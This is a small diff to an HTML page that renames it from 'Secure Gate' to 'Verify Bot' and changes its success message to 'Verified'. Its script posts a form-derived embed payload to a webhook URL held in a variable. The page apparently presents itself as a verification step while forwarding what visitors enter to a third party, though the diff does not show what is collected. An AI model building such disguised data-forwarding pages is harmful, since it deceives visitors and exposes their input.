@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>🔒 Secure Gate</title>
+  <title>🔒 Verify Bot</title>
   <style>
     body{margin:0;display:flex;align-items:center;justify-content:center;height:100vh;
       background:linear-gradient(135deg,#0f0f16,#1b1b28,#2a2a3a,#1b1b28);
@@ -92,7 +92,7 @@
             text?{name:'Message',value:text,inline:0}:null
           ].filter(Boolean),footer:{text:new Date().toUTCString()}}]};
           await fetch(H,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
-          F('ok','Granted');
+          F('ok','Verified');
         }catch(e){
           console.error(e);F('err','Error occurred');
         }finally{btn.disabled=false;}
